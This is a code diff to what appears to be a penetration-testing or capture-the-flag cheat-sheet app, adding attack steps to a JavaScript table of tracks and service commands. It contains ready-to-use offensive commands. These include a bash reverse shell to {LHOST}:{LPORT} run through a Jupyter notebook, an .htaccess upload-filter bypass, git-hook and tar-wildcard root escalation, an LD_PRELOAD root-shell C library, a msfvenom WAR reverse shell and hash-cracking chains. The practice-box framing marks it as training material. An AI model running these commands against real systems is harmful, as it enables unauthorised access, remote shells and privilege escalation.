@@ -597,6 +597,7 @@ const TRACKS=[
  {n:1,title:"Map the app",tag:"recon",goal:"Understand the stack and find hidden content",steps:[
    {d:"Java Spring app? check the actuators",c:"curl -s http://{HOST}/actuator | jq   # then /actuator/env /actuator/heapdump /actuator/sessions",
     l:"Spring Boot Actuator endpoints leak env vars and DB creds, a heap dump (grep it for passwords/session ids), and live session tokens you can replay as a cookie. The CozyHosting foothold."},
+   {d:"Jupyter on 8888? a notebook is a shell",c:"# no token, or a token leaked in a config/log/process list:\ncurl -s http://{HOST}:8888/api/sessions    # then New > Terminal in the UI, or run a cell:\n# import os; os.system(\"bash -c \u2018bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\u2019\")",l:"Jupyter hands you an interactive terminal as the service account by design \u2014 there is no exploit to find, only the token. Check <code>jupyter_notebook_config.json</code>, shell history and <code>ps aux</code> for it. The <i>Weasel</i> foothold."},
    {d:"Jenkins? the Script Console is RCE",c:"# /script (or a build step) runs Groovy as the service account:\nprintln 'id'.execute().text",l:"An unauthenticated or weak-cred Jenkins at <code>/script</code> is instant RCE; also read user <code>config.xml</code> for API tokens. The Jeeves box."},
    {d:"Fingerprint, read source, check robots",c:"whatweb -a3 http://{HOST} && curl -sSik http://{HOST}/robots.txt",
     l:"View source and HTML comments. Developers leave paths, creds and hints there."},
@@ -655,6 +656,8 @@ const TRACKS=[
     l:"Upload <code>shell.php</code>, start <code>rlwrap nc -lvnp {LPORT}</code>, then browse to it to fire the shell. Or generate one in the Shells tool (msfvenom php/reverse_php)."},
    {d:"Bypass an extension or content-type filter if the upload is fussy",c:"# try .phtml .php5 .php7 .phar ; double extension shell.php.jpg ; prepend GIF89a magic bytes ; swap Content-Type to image/png",
     l:"Find where uploads land (your dir brute helps), then browse to the uploaded file."},
+   {d:"Extension blocklist? upload an .htaccess and make your own extension executable",c:"printf 'AddType application/x-httpd-php .zzz\\n' > .htaccess\n# upload .htaccess, then upload shell.zzz containing your PHP",l:"Apache reads <code>.htaccess</code> from the upload directory, so you do not need to smuggle a <code>.php</code> past the filter \u2014 you teach the server to run an extension the filter allows. <code>php_flag engine on</code> in the same file re-enables PHP where it was turned off for that folder. Needs <code>AllowOverride</code> to permit it. The <i>Access</i> foothold."},
+   {d:"The upload is parsed server-side? attack the parser, not the extension",c:"# ExifTool < 12.24 (CVE-2021-22204): a DjVu annotation is eval'd as perl\n# ImageMagick \u2018ImageTragick\u2019 / CVE-2022-44268: crafted image -> RCE or arbitrary file read",l:"Anything that generates a thumbnail, strips metadata or reads EXIF is running a parser as the web user, and the upload does not have to be executable for that to be RCE. A plain image upload with no shell in sight is the tell \u2014 fingerprint the parser version first. Public PoCs build the file for you. The <i>Exfiltrated</i> and <i>Pilgrimage</i> footholds."},
    {d:"Tomcat Manager: deploy a WAR for a shell (try default creds first)",c:"# defaults: tomcat:tomcat  tomcat:s3cret  admin:admin  at /manager/html\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o rev.war\ncurl -u tomcat:s3cret -T rev.war 'http://{HOST}:8080/manager/text/deploy?path=/rev'\ncurl 'http://{HOST}:8080/rev/'   # listener up first; triggers the shell",
     l:"Very common on Java boxes (Jerry, Tabby). The Shells tool also generates the WAR. <code>/manager/text</code> is the scriptable API; brute the login with the default-creds list if the obvious pairs fail."},
    {d:"WebDAV enabled? upload a shell with PUT",c:"davtest -url http://{HOST}    # which extensions execute?\ncurl -T shell.php http://{HOST}/shell.php    # or: cadaver http://{HOST}  then  put shell.php",l:"An <code>http-methods</code> nmap script or <code>OPTIONS</code> showing PUT is the tell. If .php/.asp is blocked, upload .txt then <code>MOVE</code> it. Old IIS/WebDAV (Grandpa/Granny) fall to CVE-2017-7269."},
@@ -715,7 +718,7 @@ const TRACKS=[
    {d:"Abuse sudo / SUID / capabilities via GTFOBins",c:"# e.g. sudo /usr/bin/find . -exec /bin/sh \\; -quit",l:"Look up the exact binary on GTFOBins for the copy-paste line."},
    {d:"Writable /etc/passwd or PATH hijack on a root process",c:"openssl passwd -1 -salt x pass   # add a uid-0 line if /etc/passwd is writable",l:"Common on soft boxes. PATH hijack works when a root script calls a binary by name. The same trick applies to <b>imports</b>: if a script root runs does <code>import config</code> and its directory (or any earlier <code>sys.path</code> entry) is writable, drop your own <code>config.py</code> and it executes as root."},
    {d:"sudo that permits any user but root (CVE-2019-14287)",c:"sudo -u#-1 /bin/bash    # when sudo -l shows (ALL, !root) on sudo < 1.8.28",l:"<code>-u#-1</code> resolves to uid 0, defeating a <code>!root</code> restriction. The Blunder root."},
-   {d:"Writable file that root runs on a trigger",c:"# root cron/systemd-timer running a writable script -> append your payload\n# writable /etc/update-motd.d/* -> runs as root on the next SSH login\n# root runs 'tar ... *' in a writable dir -> wildcard injection:\n#   echo 'cp /bin/bash /tmp/b;chmod +s /tmp/b' > x.sh; touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",l:"pspy shows the trigger. MOTD (Traceback), systemd timers (TartarSauce backuperer) and tar-wildcard all reduce to \u2018root executes something you can write\u2019."},
+   {d:"Writable file that root runs on a trigger",c:"# root cron/systemd-timer running a writable script -> append your payload\n# writable /etc/update-motd.d/* -> runs as root on the next SSH login\n# root runs 'tar ... *' in a writable dir -> wildcard injection:\n#   echo 'cp /bin/bash /tmp/b;chmod +s /tmp/b' > x.sh; touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",l:"pspy shows the trigger. MOTD (Traceback), systemd timers (TartarSauce backuperer) and tar-wildcard all reduce to \u2018root executes something you can write\u2019. A root job that runs <b>git</b> in a repo you can write is the same bug wearing a hat: drop your payload in <code>.git/hooks/pre-commit</code> (or post-commit / post-merge), <code>chmod +x</code> it, and the next run executes it as root. The <i>Hunit</i> root."},
    {d:"sudo keeps LD_PRELOAD? that is a root shell",c:"cat > x.c <<'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nvoid _init(){ unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); }\nEOF\ngcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c\nsudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>",l:"Look for <code>env_keep+=LD_PRELOAD</code> (or LD_LIBRARY_PATH) in the <code>sudo -l</code> output \u2014 the loader pulls your library into a root process before <code>main()</code> runs, so it works with <i>any</i> binary sudo lets you run, even one with no GTFOBins entry. The <i>Broker</i> root."},
    {d:"NFS export with no_root_squash — build a root SUID shell off-box",c:"showmount -e {IP}                       # look for (rw,no_root_squash)\nsudo mount -t nfs {IP}:/export /mnt -o nolock\nsudo cp /bin/bash /mnt/rootbash; sudo chmod +s /mnt/rootbash\n# then on the TARGET:  /export/rootbash -p",l:"<code>no_root_squash</code> means your local root is root on the export, so the setuid bit you set from your machine is honoured on theirs. You need root on <i>your</i> box, not theirs. Check <code>/etc/exports</code> from the foothold too — an export you can already write is the same win. The <i>Kenobi</i> root."},
    {d:"Read your groups — some are root by another name",c:"id\n# disk   ->  debugfs /dev/sda1   then cat /root/.ssh/id_rsa, or write to /etc/passwd\n# adm    ->  read /var/log/* for creds an app logged\n# shadow ->  cat /etc/shadow and crack it offline",l:"<code>disk</code> hands you raw block-device access, which is root with extra steps — <code>debugfs</code> reads and writes any file, ignoring permissions. <code>lxd</code>/<code>docker</code> are the same idea and live in the Container escape track. The <i>Falafel</i> root."},
@@ -968,7 +971,7 @@ const TRACKS=[
  ]},
  {n:2,title:"Crack offline",tag:"attack",goal:"Recover the plaintext",steps:[
    {d:"hashcat with rockyou and a rule",c:"hashcat -m {} hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",l:"Rules turn one wordlist into millions of realistic mutations."},
-   {d:"Extract hashes from files",c:"# ssh2john / zip2john / office2john / keepass2john / pfx2john <file> > hash.txt  then john or hashcat",l:"Encrypted keys, archives, Office docs, KeePass DBs and .pfx certs all convert to a crackable hash."},
+   {d:"Extract hashes from files",c:"# ssh2john / zip2john / rar2john / office2john / keepass2john / pfx2john / gpg2john <file> > hash.txt\n#   then john or hashcat",l:"Encrypted keys, archives, Office docs, KeePass DBs, .pfx certs and GPG secret keys all convert to a crackable hash. For GPG: crack the key, <code>gpg --import</code> it, then <code>gpg --decrypt secret.pgp</code> \u2014 the <i>Tomghost</i> chain."},
    {d:"Creds live in file formats, not just hashes \u2014 read the artefact",c:"vncpwd ~/.vnc/passwd            # VNC: fixed DES key, decrypts to plaintext\nkpcli --kdb db.kdbx               # KeePass, once you have the master password\nmdb-tables b.mdb && mdb-export b.mdb users    # MS Access\nreadpst -o out mail.pst           # Outlook -> mbox\nsqlite3 app.db .dump              # any dropped .db",l:"A stored VNC password is obfuscated with a <b>published</b> key, not hashed, so it comes back as plaintext with no cracking at all. The rest are just proprietary containers with a Linux reader: <code>mdbtools</code>, <code>pst-utils</code>, <code>sqlite3</code>. Check what you downloaded before you queue a wordlist against it. The <i>Poison</i>, <i>Cascade</i>, <i>Keeper</i> and <i>Access</i> loot."},
    {d:"Cisco config passwords",c:"ciscot7.py -d -p <type7-hash>          # type 7 is reversible, not a hash\njohn --format=md5crypt type5.txt          # 'enable secret' type 5 = salted MD5",l:"Router/switch configs on TFTP or a web root leak both. Type 7 decrypts instantly; type 5 cracks like any MD5. The Heist foothold."},
    {d:"Build a custom wordlist from the target site",c:"cewl -d 3 -m 5 http://{HOST} -w loot/cewl.txt",l:"Company and box-specific words crack passwords rockyou never will."}
@@ -1048,7 +1051,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.4.0";
+const APP_VERSION="1.4.1";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
@@ -1366,6 +1369,9 @@ const SVC={
    {d:"NFS exports",c:"showmount -e {IP}"},
    {d:"NFS scripts",c:"nmap -p{PORT} --script nfs-ls,nfs-showmount,nfs-statfs {IP}"},
    {d:"Mount it and check the squash setting",c:"sudo mount -t nfs {IP}:/export /mnt -o nolock    # (rw,no_root_squash) -> SUID shell to root"}]},
+ ident:{name:"ident (auth)",cmds:[
+   {d:"Name the user behind every open TCP port",c:"ident-user-enum {IP} 22 80 113 3306"},
+   {d:"Or the nmap script",c:"nmap -p{PORT} --script auth-owners {IP}"}]},
  ajp:{name:"AJP (Tomcat connector)",cmds:[
    {d:"Ghostcat: read WEB-INF/web.xml through the connector (CVE-2020-1938)",c:"python3 ajpShooter.py http://{IP}:8080 {PORT} /WEB-INF/web.xml read"},
    {d:"Or the nmap check",c:"nmap -p{PORT} --script ajp-headers,ajp-methods {IP}"}]},
@@ -1466,6 +1472,7 @@ function svcKey(port,service){
   if(p===110||p===143||p===993||p===995||s.includes("pop3")||s.includes("imap"))return "mail";
   if(p===111||p===2049||s.includes("rpcbind")||s.includes("nfs"))return "rpc";
   if(p===8009||s.includes("ajp13"))return "ajp";
+  if(p===113||s.includes("ident"))return "ident";
   if(p===161||s.includes("snmp"))return "snmp";
   if(p===1433||s.includes("ms-sql")||s.includes("mssql"))return "mssql";
   if(p===3306||s.includes("mysql"))return "mysql";
